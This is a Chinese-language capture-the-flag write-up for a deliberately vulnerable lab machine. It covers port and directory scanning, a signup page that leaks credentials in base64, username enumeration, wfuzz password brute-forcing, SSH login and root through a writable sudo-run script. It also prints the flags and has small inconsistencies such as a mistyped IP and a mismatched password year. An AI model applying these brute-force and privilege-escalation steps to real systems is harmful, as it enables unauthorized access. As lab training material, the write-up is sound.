VM网络不通也没法改密码进去，只能下个VirtualBox和VMware互通了

[vmware与virtualbox虚拟机互通\_vmware和virtualbox互联-CSDN博客](https://blog.csdn.net/m0_55857257/article/details/133683725)
但这也不行，看来只能使用端口映射了
[Virtualbox虚拟机与主机相互访问\_virtualbox win7虚拟机与本机互访-CSDN博客](https://blog.csdn.net/lxyoucan/article/details/125058943)


# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ nmap -sV -A -T 4 -p- 192.168.18.238

```
21,22,80
这里有个ftp有个匿名访问，里面有个output 文件，记录一些登录后的操作，我们先放着。可以知道一个用户名是matthew
# 目录扫描
```css
gobuster dir -u http://192.168.18.2338/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,png -e
```

这里发现一个任意注册接口http://192.168.18.238/create_account.php，发现存在一定的规律，创建成功后会以bash64的方式返回账号密码
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ echo "dXNlcm5hbWU9YWRtaSZwYXNzd29yZD1hZG1pMjAyNEA3NzEy" | base64 -d    
username=admi&password=admi2024@7712 
```
解码后，发现密码的规律是用户名+2024@四位随机数，但是这是去年的靶场，所以应该是2023

发现还有一个用户名遍历漏洞，只要是被注册的用户都会返回 Username already exists

所以我们尝试爆破matthew用户，可以用burp但是太慢，我用wfuzz
先生成一个字典
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ crunch 4 4 0123456789 -o 1234

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ for i in {1000..10000};do echo $i;done > numbers.txt

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ wfuzz -X POST -d "username=matthew&password=matthew2024@FUZZ" -w 1234 -u http://192.168.18.238/login.php --hw 103
=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000001555:   302        0 L      0 W        0 Ch        "1554"  
```

所以用户密码是`matthew: matthew2023@1554
ssh连接
```js
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ssh matthew@192.168.18.238  //matthew2023@1554

matthew@uvalde:~$ cat user.txt 
6e4136fbed8f8c691996dbf42697d460

```
# 提权
```c
sudo -l //(ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
这里有个勒索程序
matthew@uvalde:~$ sudo /bin/bash /opt/superhack 
Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.                                                        
```
不过这里写什么并不重要，重要的是我们可以修改该文件
我们将superhack 文件重命名为superhack.back，然后重新创建一个superhack 文件，里面写入bash，然后使用sudo 执行，成功获取root 权限。
```c
matthew@uvalde:~$ cd  /opt/
matthew@uvalde:/opt$ mv superhack superhack.bak
matthew@uvalde:/opt$ echo "bash" > superhack
matthew@uvalde:/opt$ sudo -u root /bin/bash /opt/superhack

root@uvalde:~# cat root.txt
59ec54537e98a53691f33e81500f56da

```


